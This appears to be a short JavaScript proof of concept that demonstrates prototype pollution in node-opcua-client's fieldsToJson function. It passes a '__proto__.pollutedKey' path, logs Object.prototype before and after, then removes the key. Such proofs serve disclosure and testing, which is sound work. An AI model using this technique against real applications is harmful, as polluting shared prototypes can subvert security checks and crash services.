import { fieldsToJson } from "node-opcua-client";


console.log("Before:", JSON.stringify({}.__proto__));

fieldsToJson(["__proto__.pollutedKey"], [{ value: { value: "pollutedValue" } }]);

console.log("After:", JSON.stringify({}.__proto__));

// Cleanup
delete Object.prototype.pollutedKey;